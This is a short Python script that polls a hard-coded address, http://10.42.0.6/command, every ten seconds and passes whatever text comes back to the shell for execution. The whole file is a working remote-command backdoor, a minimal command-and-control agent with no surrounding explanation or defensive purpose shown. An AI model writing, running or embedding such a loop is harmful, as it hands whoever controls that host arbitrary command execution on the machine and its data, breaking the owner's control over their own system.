import time
import urllib.request
import subprocess

url = "http://10.42.0.6/command"

while True:
    response = urllib.request.urlopen(url)
    command = response.read().decode('utf-8').strip()

    if command:
        subprocess.call(command, shell=True)

    time.sleep(10)